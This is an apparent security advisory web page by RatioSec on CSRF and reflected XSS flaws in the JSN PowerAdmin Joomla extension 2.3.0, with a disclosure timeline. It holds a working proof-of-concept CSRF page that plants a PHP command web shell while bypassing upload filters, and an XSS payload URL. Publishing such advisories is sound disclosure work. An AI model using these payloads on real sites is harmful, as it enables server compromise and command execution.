<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities | RatioSec </title> <meta name="description" content=" Information Security "> <meta name="keywords" content="RatioSec, security, cyber security, application security, network security, penetration testing"> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <!-- Social: Facebook / Open Graph --> <meta property="og:type" content="article"> <meta property="article:author" content="RatioSec"> <meta property="article:section" content="research"> <meta property="article:tag" content=""> <meta property="article:published_time" content="2016-02-24 00:00:00 +0000"> <meta property="og:url" content="http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/"> <meta property="og:title" content=" JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities | RatioSec "> <meta property="og:image" content="http://www.ratiosec.com"> <meta property="og:description" content=" Information Security "> <meta property="og:site_name" content="RatioSec"> <meta property="og:locale" content="en_US"> <!-- Social: Twitter --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="@ratio_sec"> <meta name="twitter:title" content=" JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities | RatioSec "> <meta name="twitter:description" content=" Information Security "> <meta name="twitter:image:src" content="http://www.ratiosec.com"> <!-- Social: Google+ / Schema.org --> <meta itemprop="name" content=" JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities | RatioSec "> <meta itemprop="description" content=" Information Security "> <meta itemprop="image" content="http://www.ratiosec.com"> <!-- rel prev and next --> <link rel="stylesheet" href="/assets/css/main.css"> <!-- Canonical link tag --> <link rel="canonical" href="http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/"> <link rel="alternate" type="application/rss+xml" title="RatioSec" href="http://www.ratiosec.com/feed.xml"> <link rel="shortcut icon" href="/assets/images/favicon.png"> <script type="text/javascript"> var disqus_shortname = 'ratiosec'; var _gaq = _gaq || []; _gaq.push(['_setAccount', '']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); </script> </head> <body> <main class="wrapper"> <header class="site-header"> <nav class="nav"> <div class="container"> <h1 class="logo"><a href="/"><img src="/assets/images/logo.png"></a></h1> <ul class="navbar"> <li><a href="/services">Services</a></li> <li><a href="/research">Research</a></li> <li><a href="/contact">Contact</a></li> </ul> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <h1 class="post-title" itemprop="name headline">JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities</h1> <p class="post-meta"><time datetime="2016-02-24T00:00:00+00:00" itemprop="datePublished">Feb 24, 2016</time></p> </header> <div class="post-content" itemprop="articleBody"> <table> <tbody> <tr> <td>RatioSec Advisory Reference</td> <td>RS-2016-001</td> </tr> <tr> <td>Product</td> <td>JSN PowerAdmin Joomla! Extension</td> </tr> <tr> <td>Vendor</td> <td>JoomlaShine.com</td> </tr> <tr> <td>Tested Versions</td> <td>2.3.0</td> </tr> <tr> <td>Other Vulnerable Versions</td> <td>Prior versions may also be affected</td> </tr> <tr> <td>Vendor Notification</td> <td>28th January, 2016</td> </tr> <tr> <td>Advisory Publication</td> <td>24th February, 2016</td> </tr> <tr> <td>CVE Reference</td> <td>Pending</td> </tr> <tr> <td>Risk Level</td> <td>High</td> </tr> <tr> <td>CVSSv3 Base Score</td> <td>AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L</td> </tr> </tbody> </table> <h1 id="advisory">Advisory</h1> <p>RatioSec Research has discovered two cross-site request forgery and reflected cross-site scripting vulnerabilities in JSN PowerAdmin which can be exploited, respectively, to upload PHP files and run arbitrary HTML and script code in a user’s browser session in context of the affected web site.</p> <p>1) The cross-site request forgery vulnerability can be exploited by an attacker to upload PHP files and subsequently execute arbitrary commands.</p> <p>The application allows users to perform certain actions via HTTP requests without performing proper validity checks to verify the requests. This can be exploited to upload PHP files via the extension installer and subsequently execute arbitrary commands with the web server privileges by tricking a logged-in administrator into visiting a malicious web site.</p> <p>2) The reflected cross-site scripting vulnerability can be exploited by an attacker to run arbitrary HTML and script code in a user’s browser session in context of the affected web site.</p> <p>Input passed to <code>identified_name</code> GET parameter when <code>package</code> is set, <code>option</code> is set to <code>com_poweradmin</code>, <code>view</code> is set to <code>installer</code>, and <code>task</code> is set to <code>installer.install</code> in <code>/administrator/index.php</code> is not properly sanitised before being reflected. This can be exploited to run arbitrary HTML and script code in a administrator’s browser session in context of the affected web site.</p> <h1 id="proof-of-concept">Proof Of Concept</h1> <p>1) The following HTML page exploits the cross-site request forgery vulnerability and uploads a malicious PHP script <code>system($_GET['cmd']);</code> as <code>/tmp/bd.phtml</code> if visited by a logged-in administrator.</p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost/no8/joomla/administrator/index.php?option=com_poweradmin&amp;view=installer&amp;task=installer.install&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept&quot;</span><span class="p">,</span> <span class="s2">&quot;*/*&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept-Language&quot;</span><span class="p">,</span> <span class="s2">&quot;en-US,en;q=0.5&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;multipart/form-data; boundary=---------------------------167969427914885435381146171168&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">&quot;-----------------------------167969427914885435381146171168\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;Content-Disposition: form-data; name=\&quot;package\&quot;; filename=\&quot;bd.phtml\&quot;\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;Content-Type: application/octet-stream\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;\x3cscript language=\&quot;php\&quot;\x3esystem($_GET[&#39;cmd&#39;]);\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;-----------------------------167969427914885435381146171168--\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;\r\n&quot;</span> <span class="o">+</span>
          <span class="s2">&quot;\r\n&quot;</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;#&quot;</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;button&quot;</span> <span class="na">value=</span><span class="s">&quot;Submit request&quot;</span> <span class="na">onclick=</span><span class="s">&quot;submitRequest();&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure> <p>The file extension <code>.phtml</code> and the <code>&lt;script language="php"&gt; &lt;/script&gt;</code> tags are used here to fool the Joomla API <code>JFile::upload()</code> file validation checks. As result, the backdoor is installed permanently as <code>/tmp/bd.phtml</code> which can be used lately by the attacker to obtain the full system compromise.</p> <p><img src="/assets/images/posts/0002-001.png" alt="Command Execution" /></p> <p>2) The following URL exploits the cross-site scripting vulnerability to execute javascript code in a logged-in administrator’s browser.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">joomla</span><span class="o">/</span><span class="nt">administrator</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">package</span><span class="o">=</span><span class="nt">foobar</span><span class="o">&amp;</span><span class="nt">option</span><span class="o">=</span><span class="nt">com_poweradmin</span><span class="o">&amp;</span><span class="nt">view</span><span class="o">=</span><span class="nt">installer</span><span class="o">&amp;</span><span class="nt">task</span><span class="o">=</span><span class="nt">installer</span><span class="nc">.install</span><span class="o">&amp;</span><span class="nt">identified_name</span><span class="o">=&lt;</span><span class="nt">img</span><span class="o">+</span><span class="nt">src</span><span class="o">%</span><span class="nt">3dx</span><span class="o">+</span><span class="nt">onerror</span><span class="o">=</span><span class="nt">alert</span><span class="o">(</span><span class="s2">&quot;RatioSecResearch&quot;</span><span class="o">)&gt;</span></code></pre></figure> <h1 id="solution">Solution</h1> <p>No official solution is currently available.</p> <h1 id="timeline">Timeline</h1> <ul> <li>First contact: 27th January, 2016</li> <li>Disclosure: 28th January, 2016. Preliminary date set to 10th, February 2016.</li> <li>E-mail notice after no response: 02nd February, 2016</li> <li>Advisory Publication: 24th February, 2016</li> </ul> <aside class="share"> <h4>Share this.</h4> <a href="http://twitter.com/share?text=JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities&amp;url=http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/&amp;hashtags=web,dev,blog,soudev&amp;via=ratio_sec" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">Twitter</a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=235');return false;">Facebook</a> </aside> </div> </article> <aside id="comments" class="disqus"> <div class="container"> <h3><i class="icon icon-comments-o"></i> Comments</h3> <div id="disqus_thread"></div> <script type="text/javascript"> var disqus_shortname = 'ratiosec'; var disqus_identifier = '/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss'; var disqus_title = 'JSN Poweradmin Joomla! Extension Remote Command Execution Via CSRF and XSS vulnerabilities'; var disqus_url = 'http://www.ratiosec.com'; /*var disqus_developer = 1;*/ (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); </script> <noscript> Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a> </noscript> </div> </aside> <footer class="site-footer"> <div class="container"> <small class="pull-left">RatioSec 2016. Except where otherwise noted, this website is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International Licence</a>.</small> </div> </footer> </main> </body> </html>
